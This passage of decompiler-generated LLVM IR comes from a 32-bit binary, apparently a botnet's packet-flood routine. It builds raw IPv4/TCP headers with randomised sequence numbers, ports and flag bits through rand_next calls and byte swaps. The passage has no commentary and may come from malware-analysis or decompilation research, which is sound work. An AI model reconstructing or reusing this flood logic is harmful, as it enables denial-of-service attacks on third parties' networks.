  %v0_804b4a2 = load i32, i32* @edi, align 4
  %v2_804b4a2 = add i32 %v0_804b45a, 16
  %v3_804b4a2 = inttoptr i32 %v2_804b4a2 to i32*
  store i32 %v0_804b4a2, i32* %v3_804b4a2, align 4
  %v2_804b4a3 = call i32 @__GI___libc_close(i32 %v1_804b367)
  store i32 %v2_804b4a3, i32* %eax.global-to-local, align 4
  %v0_804b4a8 = load i32, i32* @esp, align 4
  %v1_804b4a8 = add i32 %v0_804b4a8, 16
  br label %dec_label_pc_804b34e

dec_label_pc_804b4b0:                             ; preds = %dec_label_pc_804b410
  %v0_804b4b3 = load i32, i32* @edi, align 4
  %v3_804b4b3 = inttoptr i32 %v0_804b41c to i32*
  store i32 %v0_804b4b3, i32* %v3_804b4b3, align 4
  %v2_804b4b4 = call i32 @__GI___libc_close(i32 %v1_804b367)
  store i32 %v2_804b4b4, i32* %eax.global-to-local, align 4
  %v0_804b4b9 = load i32, i32* @esp, align 4
  %v1_804b4b9 = add i32 %v0_804b4b9, 16
  br label %dec_label_pc_804b360

dec_label_pc_804b4c1:                             ; preds = %dec_label_pc_804b2ee
  store i32 %v3_804b2db, i32* @eax, align 4
  store i32 %v3_804b2db, i32* %stack_var_-412, align 4
  %v1_804b4c9 = call i32 @__GI___libc_close(i32 %v3_804b2db)
  store i32 %v1_804b4c9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b4d1

dec_label_pc_804b4d1:                             ; preds = %dec_label_pc_804b428, %dec_label_pc_804b839, %entry, %dec_label_pc_804b4c1
  %v0_804b4db = phi i32 [ 0, %entry ], [ %v1_804b4c9, %dec_label_pc_804b4c1 ], [ %v2_804b83e, %dec_label_pc_804b839 ], [ -1, %dec_label_pc_804b428 ]
  %v0_804b4d1 = phi i32 [ %v12_804b1ed, %entry ], [ %v12_804b1ed, %dec_label_pc_804b4c1 ], [ %v1_804b843, %dec_label_pc_804b839 ], [ %v1_804b45a, %dec_label_pc_804b428 ]
  %v1_804b4d1 = add i32 %v0_804b4d1, 380
  %v1_804b4d7 = inttoptr i32 %v1_804b4d1 to i32*
  %v2_804b4d7 = load i32, i32* %v1_804b4d7, align 4
  store i32 %v2_804b4d7, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804b4db

dec_label_pc_804b4dc:                             ; preds = %dec_label_pc_804b37a
  store i32 %v3_804b4dc, i32* %ebx.global-to-local, align 4
  %v0_804b4df = load i32, i32* %stack_var_-412, align 4
  %v1_804b4df = call i32 @rand_next(i32 %v0_804b4df)
  store i32 %v1_804b4df, i32* %eax.global-to-local, align 4
  %v1_804b4e4 = trunc i32 %v3_804b4dc to i16
  %v2_804b4e4 = call i16 @llvm.bswap.i16(i16 %v1_804b4e4)
  %v3_804b4e4 = zext i16 %v2_804b4e4 to i32
  %v1_804b4e8 = udiv i32 %v3_804b4dc, 65536
  %v2_804b4e8 = mul nuw i32 %v3_804b4e4, 65536
  %v1_804b4eb = trunc i32 %v1_804b4e8 to i16
  %v2_804b4eb = call i16 @llvm.bswap.i16(i16 %v1_804b4eb)
  %v3_804b4eb = zext i16 %v2_804b4eb to i32
  %v6_804b4eb = or i32 %v3_804b4eb, %v2_804b4e8
  store i32 %v6_804b4eb, i32* %ebx.global-to-local, align 4
  %v0_804b4ef = load i32, i32* @esp, align 4
  %v1_804b4ef = add i32 %v0_804b4ef, 376
  %v2_804b4ef = inttoptr i32 %v1_804b4ef to i32*
  %v3_804b4ef = load i32, i32* %v2_804b4ef, align 4
  store i32 %v3_804b4ef, i32* %edx.global-to-local, align 4
  %v1_804b4f6 = add i32 %v0_804b4ef, 408
  %v2_804b4f6 = inttoptr i32 %v1_804b4f6 to i32*
  %v3_804b4f6 = load i32, i32* %v2_804b4f6, align 4
  store i32 %v3_804b4f6, i32* @esi, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v3_804b4ff = mul i32 %v3_804b4ef, 3
  store i32 %v3_804b4ff, i32* %edx.global-to-local, align 4
  %v2_804b502 = mul i32 %v3_804b4ef, 24
  %v3_804b502 = add i32 %v2_804b502, 20
  %v4_804b502 = add i32 %v3_804b502, %v3_804b4f6
  %v5_804b502 = inttoptr i32 %v4_804b502 to i8*
  %v6_804b502 = load i8, i8* %v5_804b502, align 1
  %v7_804b502 = zext i8 %v6_804b502 to i32
  store i32 %v7_804b502, i32* %ecx.global-to-local, align 4
  %tmp = urem i8 %v6_804b502, 32
  %v4_804b506 = icmp eq i8 %tmp, 0
  br i1 %v4_804b506, label %bb61, label %bb

bb:                                               ; preds = %dec_label_pc_804b4dc
  %v2_804b506 = zext i8 %tmp to i32
  %v5_804b506 = lshr i32 %v1_804b4df, %v2_804b506
  store i32 %v5_804b506, i32* %eax.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_804b4dc, %bb
  %v1_804b508 = phi i32 [ %v1_804b4df, %dec_label_pc_804b4dc ], [ %v5_804b506, %bb ]
  %v2_804b508 = add i32 %v1_804b508, %v6_804b4eb
  %v1_804b50a = trunc i32 %v2_804b508 to i16
  %v2_804b50a = call i16 @llvm.bswap.i16(i16 %v1_804b50a)
  %v3_804b50a = zext i16 %v2_804b50a to i32
  %v1_804b50e = udiv i32 %v2_804b508, 65536
  %v2_804b50e = mul nuw i32 %v3_804b50a, 65536
  %v1_804b511 = trunc i32 %v1_804b50e to i16
  %v2_804b511 = call i16 @llvm.bswap.i16(i16 %v1_804b511)
  %v3_804b511 = zext i16 %v2_804b511 to i32
  %v6_804b511 = or i32 %v3_804b511, %v2_804b50e
  store i32 %v6_804b511, i32* @ebx, align 4
  %v1_804b515 = add i32 %v0_804b4ef, 52
  %v2_804b515 = inttoptr i32 %v1_804b515 to i16*
  %v3_804b515 = load i16, i16* %v2_804b515, align 2
  %v13_804b515 = icmp eq i16 %v3_804b515, -1
  %v2_804b51b = add i32 %v0_804b4ef, 360
  %v3_804b51b = inttoptr i32 %v2_804b51b to i32*
  store i32 %v6_804b511, i32* %v3_804b51b, align 4
  %v1_804b522 = icmp eq i1 %v13_804b515, false
  br i1 %v1_804b522, label %.dec_label_pc_804b3d5_crit_edge, label %dec_label_pc_804b528

.dec_label_pc_804b3d5_crit_edge:                  ; preds = %bb61
  %v0_804b3d5.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804b3d5

dec_label_pc_804b528:                             ; preds = %bb61, %dec_label_pc_804b3bf
  %v0_804b528 = load i32, i32* %stack_var_-412, align 4
  %v1_804b528 = call i32 @rand_next(i32 %v0_804b528)
  store i32 %v1_804b528, i32* %eax.global-to-local, align 4
  %v1_804b52d = trunc i32 %v1_804b528 to i16
  %v2_804b52d = load i32, i32* @esp, align 4
  %v3_804b52d = add i32 %v2_804b52d, 358
  %v4_804b52d = inttoptr i32 %v3_804b52d to i16*
  store i16 %v1_804b52d, i16* %v4_804b52d, align 2
  br label %dec_label_pc_804b3e2

dec_label_pc_804b53a:                             ; preds = %dec_label_pc_804b485
  %v1_804b53a = add i32 %v0_804b45a, 408
  %v2_804b53a = inttoptr i32 %v1_804b53a to i32*
  %v3_804b53a = load i32, i32* %v2_804b53a, align 4
  store i32 %v3_804b53a, i32* %ebx.global-to-local, align 4
  %v1_804b541 = add i32 %v0_804b45a, 64
  %v2_804b541 = inttoptr i32 %v1_804b541 to i32*
  %v3_804b541 = load i32, i32* %v2_804b541, align 4
  store i32 %v3_804b541, i32* %eax.global-to-local, align 4
  %v2_804b547 = mul i32 %v3_804b53a, 16
  store i32 %v2_804b547, i32* %edx.global-to-local, align 4
  %v3_804b54a = add i32 %v3_804b541, %v2_804b547
  %v4_804b54a = inttoptr i32 %v3_804b54a to i32*
  store i32 %v3_804b462, i32* %v4_804b54a, align 4
  %v0_804b54d = load i32, i32* @esp, align 4
  %v1_804b54d = add i32 %v0_804b54d, 72
  %v2_804b54d = inttoptr i32 %v1_804b54d to i32*
  %v3_804b54d = load i32, i32* %v2_804b54d, align 4
  store i32 %v3_804b54d, i32* %ecx.global-to-local, align 4
  %v1_804b551 = add i32 %v3_804b54d, 4
  %v2_804b551 = inttoptr i32 %v1_804b551 to i32*
  %v3_804b551 = load i32, i32* %v2_804b551, align 4
  store i32 %v3_804b551, i32* %eax.global-to-local, align 4
  %v1_804b554 = add i32 %v0_804b54d, 32
  %v2_804b554 = inttoptr i32 %v1_804b554 to i32*
  %v3_804b554 = load i32, i32* %v2_804b554, align 4
  store i32 %v3_804b554, i32* %ecx.global-to-local, align 4
  %v1_804b558 = trunc i32 %v3_804b551 to i16
  %v2_804b558 = call i16 @llvm.bswap.i16(i16 %v1_804b558)
  %v3_804b558 = zext i16 %v2_804b558 to i32
  %v1_804b55c = udiv i32 %v3_804b551, 65536
  %v2_804b55c = mul nuw i32 %v3_804b558, 65536
  %v1_804b55f = trunc i32 %v1_804b55c to i16
  %v2_804b55f = call i16 @llvm.bswap.i16(i16 %v1_804b55f)
  %v3_804b55f = zext i16 %v2_804b55f to i32
  %v6_804b55f = or i32 %v3_804b55f, %v2_804b55c
  store i32 %v6_804b55f, i32* %eax.global-to-local, align 4
  %v1_804b563 = load i32, i32* %edx.global-to-local, align 4
  %v3_804b563 = add i32 %v3_804b554, 4
  %v4_804b563 = add i32 %v3_804b563, %v1_804b563
  %v5_804b563 = inttoptr i32 %v4_804b563 to i32*
  store i32 %v6_804b55f, i32* %v5_804b563, align 4
  %v0_804b567 = load i32, i32* @esp, align 4
  %v1_804b567 = add i32 %v0_804b567, 72
  %v2_804b567 = inttoptr i32 %v1_804b567 to i32*
  %v3_804b567 = load i32, i32* %v2_804b567, align 4
  store i32 %v3_804b567, i32* %ecx.global-to-local, align 4
  %v1_804b56b = add i32 %v3_804b567, 8
  %v2_804b56b = inttoptr i32 %v1_804b56b to i32*
  %v3_804b56b = load i32, i32* %v2_804b56b, align 4
  store i32 %v3_804b56b, i32* %eax.global-to-local, align 4
  %v1_804b56e = add i32 %v0_804b567, 32
  %v2_804b56e = inttoptr i32 %v1_804b56e to i32*
  %v3_804b56e = load i32, i32* %v2_804b56e, align 4
  store i32 %v3_804b56e, i32* %ecx.global-to-local, align 4
  %v1_804b572 = trunc i32 %v3_804b56b to i16
  %v2_804b572 = call i16 @llvm.bswap.i16(i16 %v1_804b572)
  %v3_804b572 = zext i16 %v2_804b572 to i32
  %v1_804b576 = udiv i32 %v3_804b56b, 65536
  %v2_804b576 = mul nuw i32 %v3_804b572, 65536
  %v1_804b579 = trunc i32 %v1_804b576 to i16
  %v2_804b579 = call i16 @llvm.bswap.i16(i16 %v1_804b579)
  %v3_804b579 = zext i16 %v2_804b579 to i32
  %v6_804b579 = or i32 %v3_804b579, %v2_804b576
  store i32 %v6_804b579, i32* %eax.global-to-local, align 4
  %v1_804b57d = load i32, i32* %edx.global-to-local, align 4
  %v3_804b57d = add i32 %v3_804b56e, 8
  %v4_804b57d = add i32 %v3_804b57d, %v1_804b57d
  %v5_804b57d = inttoptr i32 %v4_804b57d to i32*
  store i32 %v6_804b579, i32* %v5_804b57d, align 4
  %v0_804b581 = load i32, i32* @esp, align 4
  %v1_804b581 = add i32 %v0_804b581, 72
  %v2_804b581 = inttoptr i32 %v1_804b581 to i32*
  %v3_804b581 = load i32, i32* %v2_804b581, align 4
  store i32 %v3_804b581, i32* %ecx.global-to-local, align 4
  %v1_804b585 = add i32 %v3_804b581, 2
  %v2_804b585 = inttoptr i32 %v1_804b585 to i16*
  %v3_804b585 = load i16, i16* %v2_804b585, align 2
  %v4_804b585 = zext i16 %v3_804b585 to i32
  %v5_804b585 = load i32, i32* %eax.global-to-local, align 4
  %v6_804b585 = and i32 %v5_804b585, -65536
  %v7_804b585 = or i32 %v6_804b585, %v4_804b585
  store i32 %v7_804b585, i32* %eax.global-to-local, align 4
  %v1_804b589 = add i32 %v0_804b581, 32
  %v2_804b589 = inttoptr i32 %v1_804b589 to i32*
  %v3_804b589 = load i32, i32* %v2_804b589, align 4
  store i32 %v3_804b589, i32* %ecx.global-to-local, align 4
  %v0_804b58d = load i32, i32* @esi, align 4
  %v1_804b58d = trunc i32 %v0_804b58d to i16
  %v2_804b58d = load i32, i32* %edx.global-to-local, align 4
  %v4_804b58d = add i32 %v3_804b589, 14
  %v5_804b58d = add i32 %v4_804b58d, %v2_804b58d
  %v6_804b58d = inttoptr i32 %v5_804b58d to i16*
  store i16 %v1_804b58d, i16* %v6_804b58d, align 2
  %v0_804b592 = load i32, i32* @esp, align 4
  %v1_804b592 = add i32 %v0_804b592, 36
  %v2_804b592 = inttoptr i32 %v1_804b592 to i32*
  %v3_804b592 = load i32, i32* %v2_804b592, align 4
  store i32 %v3_804b592, i32* @esi, align 4
  %v0_804b599 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b599 = trunc i32 %v0_804b599 to i16
  %v2_804b599 = load i32, i32* %edx.global-to-local, align 4
  %v3_804b599 = load i32, i32* %ecx.global-to-local, align 4
  %v4_804b599 = add i32 %v2_804b599, 12
  %v5_804b599 = add i32 %v4_804b599, %v3_804b599
  %v6_804b599 = inttoptr i32 %v5_804b599 to i16*
  store i16 %v1_804b599, i16* %v6_804b599, align 2
  %v0_804b59e = load i32, i32* @esi, align 4
  %v1_804b59e = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b59e = mul i32 %v1_804b59e, 4
  %v3_804b59e = add i32 %v2_804b59e, %v0_804b59e
  store i32 %v3_804b59e, i32* @ebx, align 4
  %v0_804b5a1 = load i32, i32* @esp, align 4
  %v1_804b5a1 = add i32 %v0_804b5a1, 72
  %v2_804b5a1 = inttoptr i32 %v1_804b5a1 to i32*
  %v3_804b5a1 = load i32, i32* %v2_804b5a1, align 4
  %v1_804b5a5 = add i32 %v3_804b5a1, 40
  store i32 %v1_804b5a5, i32* %eax.global-to-local, align 4
  %v2_804b5a8 = add i32 %v0_804b5a1, -4
  %v3_804b5a8 = inttoptr i32 %v2_804b5a8 to i32*
  store i32 %v1_804b5a5, i32* %v3_804b5a8, align 4
  %v0_804b5a9 = load i32, i32* %stack_var_-412, align 4
  %v1_804b5a9 = call i32 @malloc(i32 %v0_804b5a9)
  store i32 %v1_804b5a9, i32* %eax.global-to-local, align 4
  %v1_804b5ae = load i32, i32* @ebx, align 4
  %v2_804b5ae = inttoptr i32 %v1_804b5ae to i32*
  store i32 %v1_804b5a9, i32* %v2_804b5ae, align 4
  %v0_804b5b0 = load i32, i32* @esp, align 4
  %v1_804b5b0 = add i32 %v0_804b5b0, 392
  %v2_804b5b0 = inttoptr i32 %v1_804b5b0 to i32*
  %v3_804b5b0 = load i32, i32* %v2_804b5b0, align 4
  store i32 %v3_804b5b0, i32* %eax.global-to-local, align 4
  %v0_804b5b7 = load i32, i32* @esi, align 4
  %v2_804b5b7 = mul i32 %v3_804b5b0, 4
  %v3_804b5b7 = add i32 %v0_804b5b7, %v2_804b5b7
  %v4_804b5b7 = inttoptr i32 %v3_804b5b7 to i32*
  %v5_804b5b7 = load i32, i32* %v4_804b5b7, align 4
  store i32 %v5_804b5b7, i32* @ebx, align 4
  %v1_804b5ba = add i32 %v5_804b5b7, 20
  store i32 %v1_804b5ba, i32* %eax.global-to-local, align 4
  %v1_804b5bd = add i32 %v5_804b5b7, 40
  store i32 %v1_804b5bd, i32* @esi, align 4
  %v2_804b5c0 = add i32 %v0_804b5b0, 88
  %v3_804b5c0 = inttoptr i32 %v2_804b5c0 to i32*
  store i32 %v1_804b5ba, i32* %v3_804b5c0, align 4
  %v0_804b5c4 = load i32, i32* @ebx, align 4
  %v1_804b5c4 = inttoptr i32 %v0_804b5c4 to i8*
  store i8 69, i8* %v1_804b5c4, align 1
  %v0_804b5c7 = load i32, i32* @esp, align 4
  %v1_804b5c7 = add i32 %v0_804b5c7, 63
  %v2_804b5c7 = inttoptr i32 %v1_804b5c7 to i8*
  %v3_804b5c7 = load i8, i8* %v2_804b5c7, align 1
  %v4_804b5c7 = zext i8 %v3_804b5c7 to i32
  %v5_804b5c7 = load i32, i32* @edx, align 4
  %v6_804b5c7 = and i32 %v5_804b5c7, -256
  %v7_804b5c7 = or i32 %v6_804b5c7, %v4_804b5c7
  store i32 %v7_804b5c7, i32* %edx.global-to-local, align 4
  %v2_804b5cb = load i32, i32* @ebx, align 4
  %v3_804b5cb = add i32 %v2_804b5cb, 1
  %v4_804b5cb = inttoptr i32 %v3_804b5cb to i8*
  store i8 %v3_804b5c7, i8* %v4_804b5cb, align 1
  %v0_804b5ce = load i32, i32* @esp, align 4
  %v1_804b5ce = add i32 %v0_804b5ce, 28
  %v2_804b5ce = inttoptr i32 %v1_804b5ce to i32*
  %v3_804b5ce = load i32, i32* %v2_804b5ce, align 4
  store i32 %v3_804b5ce, i32* %ecx.global-to-local, align 4
  %v1_804b5d2 = add i32 %v0_804b5ce, 64
  %v2_804b5d2 = inttoptr i32 %v1_804b5d2 to i32*
  %v3_804b5d2 = load i32, i32* %v2_804b5d2, align 4
  %v1_804b5d6 = trunc i32 %v3_804b5d2 to i16
  %v2_804b5d6 = call i16 @llvm.bswap.i16(i16 %v1_804b5d6)
  %v3_804b5d6 = zext i16 %v2_804b5d6 to i32
  %v5_804b5d6 = and i32 %v3_804b5d2, -65536
  %v6_804b5d6 = or i32 %v3_804b5d6, %v5_804b5d6
  store i32 %v6_804b5d6, i32* %eax.global-to-local, align 4
  %v2_804b5da = load i32, i32* @ebx, align 4
  %v3_804b5da = add i32 %v2_804b5da, 4
  %v4_804b5da = inttoptr i32 %v3_804b5da to i16*
  store i16 %v2_804b5d6, i16* %v4_804b5da, align 2
  %v0_804b5de = load i32, i32* @esp, align 4
  %v1_804b5de = add i32 %v0_804b5de, 66
  %v2_804b5de = inttoptr i32 %v1_804b5de to i8*
  %v3_804b5de = load i8, i8* %v2_804b5de, align 1
  %v4_804b5de = zext i8 %v3_804b5de to i32
  %v5_804b5de = load i32, i32* %eax.global-to-local, align 4
  %v6_804b5de = and i32 %v5_804b5de, -256
  %v7_804b5de = or i32 %v6_804b5de, %v4_804b5de
  store i32 %v7_804b5de, i32* %eax.global-to-local, align 4
  %v2_804b5e5 = load i32, i32* @ebx, align 4
  %v3_804b5e5 = add i32 %v2_804b5e5, 8
  %v4_804b5e5 = inttoptr i32 %v3_804b5e5 to i8*
  store i8 %v3_804b5de, i8* %v4_804b5e5, align 1
  %v0_804b5e8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804b5e8 = trunc i32 %v0_804b5e8 to i16
  %v2_804b5e8 = load i32, i32* @ebx, align 4
  %v3_804b5e8 = add i32 %v2_804b5e8, 2
  %v4_804b5e8 = inttoptr i32 %v3_804b5e8 to i16*
  store i16 %v1_804b5e8, i16* %v4_804b5e8, align 2
  %v0_804b5ec = load i32, i32* @esp, align 4
  %v1_804b5ec = add i32 %v0_804b5ec, 51
  %v2_804b5ec = inttoptr i32 %v1_804b5ec to i8*
  %v3_804b5ec = load i8, i8* %v2_804b5ec, align 1
  %v4_804b5ec = icmp eq i8 %v3_804b5ec, 0
  br i1 %v4_804b5ec, label %dec_label_pc_804b5f9, label %dec_label_pc_804b5f3

dec_label_pc_804b5f3:                             ; preds = %dec_label_pc_804b53a
  %v0_804b5f3 = load i32, i32* @ebx, align 4
  %v1_804b5f3 = add i32 %v0_804b5f3, 6
  %v2_804b5f3 = inttoptr i32 %v1_804b5f3 to i16*
  store i16 64, i16* %v2_804b5f3, align 2
  br label %dec_label_pc_804b5f9

dec_label_pc_804b5f9:                             ; preds = %dec_label_pc_804b53a, %dec_label_pc_804b5f3
  %v0_804b5f9 = load i32, i32* @ebx, align 4
  %v1_804b5f9 = add i32 %v0_804b5f9, 9
  %v2_804b5f9 = inttoptr i32 %v1_804b5f9 to i8*
  store i8 6, i8* %v2_804b5f9, align 1
  %v0_804b5fd = load i32, i32* @global_var_805a858.27, align 8
  store i32 %v0_804b5fd, i32* %eax.global-to-local, align 4
  %v0_804b602 = load i32, i32* @esp, align 4
  %v1_804b602 = add i32 %v0_804b602, 32
  %v2_804b602 = inttoptr i32 %v1_804b602 to i32*
  %v3_804b602 = load i32, i32* %v2_804b602, align 4
  store i32 %v3_804b602, i32* %ecx.global-to-local, align 4
  %v1_804b606 = load i32, i32* @ebx, align 4
  %v2_804b606 = add i32 %v1_804b606, 12
  %v3_804b606 = inttoptr i32 %v2_804b606 to i32*
  store i32 %v0_804b5fd, i32* %v3_804b606, align 4
  %v0_804b609 = load i32, i32* @esp, align 4
  %v1_804b609 = add i32 %v0_804b609, 376
  %v2_804b609 = inttoptr i32 %v1_804b609 to i32*
  %v3_804b609 = load i32, i32* %v2_804b609, align 4
  %v2_804b610 = mul i32 %v3_804b609, 16
  store i32 %v2_804b610, i32* %eax.global-to-local, align 4
  %v1_804b613 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804b613 = add i32 %v1_804b613, %v2_804b610
  %v3_804b613 = inttoptr i32 %v2_804b613 to i32*
  %v4_804b613 = load i32, i32* %v3_804b613, align 4
  store i32 %v4_804b613, i32* %edx.global-to-local, align 4
  %v1_804b616 = load i32, i32* @ebx, align 4
  %v2_804b616 = add i32 %v1_804b616, 16
  %v3_804b616 = inttoptr i32 %v2_804b616 to i32*
  store i32 %v4_804b613, i32* %v3_804b616, align 4
  %v0_804b619 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b619 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804b619 = add i32 %v0_804b619, 12
  %v3_804b619 = add i32 %v2_804b619, %v1_804b619
  %v4_804b619 = inttoptr i32 %v3_804b619 to i32*
  %v5_804b619 = load i32, i32* %v4_804b619, align 4
  store i32 %v5_804b619, i32* %edx.global-to-local, align 4
  %v1_804b61d = trunc i32 %v5_804b619 to i16
  %v2_804b61d = load i32, i32* @ebx, align 4
  %v3_804b61d = add i32 %v2_804b61d, 20
  %v4_804b61d = inttoptr i32 %v3_804b61d to i16*
  store i16 %v1_804b61d, i16* %v4_804b61d, align 2
  %v0_804b621 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b621 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804b621 = add i32 %v0_804b621, 14
  %v3_804b621 = add i32 %v2_804b621, %v1_804b621
  %v4_804b621 = inttoptr i32 %v3_804b621 to i16*
  %v5_804b621 = load i16, i16* %v4_804b621, align 2
  %v6_804b621 = zext i16 %v5_804b621 to i32
  %v7_804b621 = load i32, i32* %edx.global-to-local, align 4
  %v8_804b621 = and i32 %v7_804b621, -65536
  %v9_804b621 = or i32 %v8_804b621, %v6_804b621
  store i32 %v9_804b621, i32* %edx.global-to-local, align 4
  %v0_804b626 = load i32, i32* @esp, align 4
  %v1_804b626 = add i32 %v0_804b626, 72
  %v2_804b626 = inttoptr i32 %v1_804b626 to i32*
  %v3_804b626 = load i32, i32* %v2_804b626, align 4
  store i32 %v3_804b626, i32* %ecx.global-to-local, align 4
  %v3_804b62a = add i32 %v3_804b626, 2
  %v4_804b62a = inttoptr i32 %v3_804b62a to i16*
  store i16 %v5_804b621, i16* %v4_804b62a, align 2
  %v0_804b62e = load i32, i32* @esp, align 4
  %v1_804b62e = add i32 %v0_804b62e, 32
  %v2_804b62e = inttoptr i32 %v1_804b62e to i32*
  %v3_804b62e = load i32, i32* %v2_804b62e, align 4
  store i32 %v3_804b62e, i32* %ecx.global-to-local, align 4
  %v0_804b632 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b632 = add i32 %v3_804b62e, 8
  %v3_804b632 = add i32 %v2_804b632, %v0_804b632
  %v4_804b632 = inttoptr i32 %v3_804b632 to i32*
  %v5_804b632 = load i32, i32* %v4_804b632, align 4
  store i32 %v5_804b632, i32* %edx.global-to-local, align 4
  %v1_804b636 = add i32 %v0_804b62e, 72
  %v2_804b636 = inttoptr i32 %v1_804b636 to i32*
  %v3_804b636 = load i32, i32* %v2_804b636, align 4
  store i32 %v3_804b636, i32* %ecx.global-to-local, align 4
  %v2_804b63a = add i32 %v3_804b636, 4
  %v3_804b63a = inttoptr i32 %v2_804b63a to i32*
  store i32 %v5_804b632, i32* %v3_804b63a, align 4
  %v0_804b63d = load i32, i32* @esp, align 4
  %v1_804b63d = add i32 %v0_804b63d, 32
  %v2_804b63d = inttoptr i32 %v1_804b63d to i32*
  %v3_804b63d = load i32, i32* %v2_804b63d, align 4
  store i32 %v3_804b63d, i32* %edx.global-to-local, align 4
  %v0_804b641 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b641 = add i32 %v3_804b63d, 4
  %v3_804b641 = add i32 %v2_804b641, %v0_804b641
  %v4_804b641 = inttoptr i32 %v3_804b641 to i32*
  %v5_804b641 = load i32, i32* %v4_804b641, align 4
  store i32 %v5_804b641, i32* %eax.global-to-local, align 4
  %v1_804b645 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804b645 = add i32 %v1_804b645, 8
  %v3_804b645 = inttoptr i32 %v2_804b645 to i32*
  store i32 %v5_804b641, i32* %v3_804b645, align 4
  %v0_804b648 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804b648 = add i32 %v0_804b648, 12
  %v2_804b648 = inttoptr i32 %v1_804b648 to i8*
  %v3_804b648 = load i8, i8* %v2_804b648, align 1
  %v4_804b648 = zext i8 %v3_804b648 to i32
  %v5_804b648 = load i32, i32* %eax.global-to-local, align 4
  %v6_804b648 = and i32 %v5_804b648, -256
  %v7_804b648 = or i32 %v6_804b648, %v4_804b648
  store i32 %v7_804b648, i32* %eax.global-to-local, align 4
  %v1_804b64b = add i32 %v0_804b648, 13
  %v2_804b64b = inttoptr i32 %v1_804b64b to i8*
  %v3_804b64b = load i8, i8* %v2_804b64b, align 1
  %v4_804b64b = or i8 %v3_804b64b, 17
  store i8 %v4_804b64b, i8* %v2_804b64b, align 1
  %v0_804b64f = load i32, i32* %eax.global-to-local, align 4
  %v1_804b64f = urem i32 %v0_804b64f, 16
  %v1_804b652 = or i32 %v1_804b64f, -128
  %v2_804b652 = trunc i32 %v1_804b652 to i8
  store i32 %v1_804b652, i32* %eax.global-to-local, align 4
  %v2_804b655 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804b655 = add i32 %v2_804b655, 12
  %v4_804b655 = inttoptr i32 %v3_804b655 to i8*
  store i8 %v2_804b652, i8* %v4_804b655, align 1
  %v0_804b658 = load i32, i32* %stack_var_-412, align 4
  %v1_804b658 = call i32 @rand_next(i32 %v0_804b658)
  %v2_804b658 = trunc i32 %v1_804b658 to i16
  store i32 %v1_804b658, i32* %eax.global-to-local, align 4
  %v0_804b65d = load i32, i32* @esp, align 4
  %v1_804b65d = add i32 %v0_804b65d, 72
  %v2_804b65d = inttoptr i32 %v1_804b65d to i32*
  %v3_804b65d = load i32, i32* %v2_804b65d, align 4
  store i32 %v3_804b65d, i32* %ecx.global-to-local, align 4
  %v3_804b661 = load i32, i32* %v2_804b65d, align 4
  store i32 %v3_804b661, i32* %edx.global-to-local, align 4
  %v4_804b665 = add i32 %v3_804b65d, 14
  %v5_804b665 = inttoptr i32 %v4_804b665 to i16*
  store i16 %v2_804b658, i16* %v5_804b665, align 2
  %v0_804b669 = load i32, i32* @esp, align 4
  %v1_804b669 = add i32 %v0_804b669, 54
  %v2_804b669 = inttoptr i32 %v1_804b669 to i8*
  %v3_804b669 = load i8, i8* %v2_804b669, align 1
  %v4_804b669 = zext i8 %v3_804b669 to i32
  %v5_804b669 = load i32, i32* %ecx.global-to-local, align 4
  %v6_804b669 = and i32 %v5_804b669, -256
  %v7_804b669 = or i32 %v6_804b669, %v4_804b669
  store i32 %v7_804b669, i32* %ecx.global-to-local, align 4
  %v0_804b66d = load i32, i32* %edx.global-to-local, align 4
  %v1_804b66d = add i32 %v0_804b66d, 13
  %v2_804b66d = inttoptr i32 %v1_804b66d to i8*
  %v3_804b66d = load i8, i8* %v2_804b66d, align 1
  %v4_804b66d = zext i8 %v3_804b66d to i32
  %sext3 = mul i32 %v1_804b658, 65536
  %v6_804b66d = sdiv i32 %sext3, 65536
  %v7_804b66d = and i32 %v6_804b66d, -256
  %v8_804b66d = or i32 %v4_804b66d, %v7_804b66d
  store i32 %v8_804b66d, i32* %eax.global-to-local, align 4
  %tmp87 = urem i8 %v3_804b669, 2
  %v1_804b670 = zext i8 %tmp87 to i32
  store i32 %v1_804b670, i32* %ecx.global-to-local, align 4
  %v1_804b673 = add i32 %v0_804b669, 55
  %v2_804b673 = inttoptr i32 %v1_804b673 to i8*
  %v3_804b673 = load i8, i8* %v2_804b673, align 1
  %v4_804b673 = zext i8 %v3_804b673 to i32
  %v1_804b677 = and i32 %v8_804b66d, -49
  %tmp88 = sub nsw i32 0, %v1_804b670
  %v2_804b67a = and i32 %tmp88, 32
  store i32 %v2_804b67a, i32* %ecx.global-to-local, align 4
  %v1_804b67d = mul nuw nsw i32 %v4_804b673, 16
  %v2_804b680 = and i32 %v1_804b67d, 16
  store i32 %v2_804b680, i32* %edx.global-to-local, align 4
  %v2_804b683 = or i32 %v1_804b677, %v2_804b67a
  store i32 %v2_804b683, i32* %eax.global-to-local, align 4
  %v1_804b685 = add i32 %v0_804b669, 56
  %v2_804b685 = inttoptr i32 %v1_804b685 to i8*
  %v3_804b685 = load i8, i8* %v2_804b685, align 1
  %v2_804b689 = or i32 %v2_804b680, %v2_804b683
  store i32 %v2_804b689, i32* %eax.global-to-local, align 4
  %tmp89 = urem i8 %v3_804b685, 2
  %v1_804b68b = zext i8 %tmp89 to i32
  store i32 %v1_804b68b, i32* %ecx.global-to-local, align 4
  %v1_804b68e = add i32 %v0_804b669, 57
  %v2_804b68e = inttoptr i32 %v1_804b68e to i8*
  %v3_804b68e = load i8, i8* %v2_804b68e, align 1
  %tmp90 = sub nsw i32 0, %v1_804b68b
  %v2_804b692 = and i32 %tmp90, 8
  store i32 %v2_804b692, i32* %ecx.global-to-local, align 4
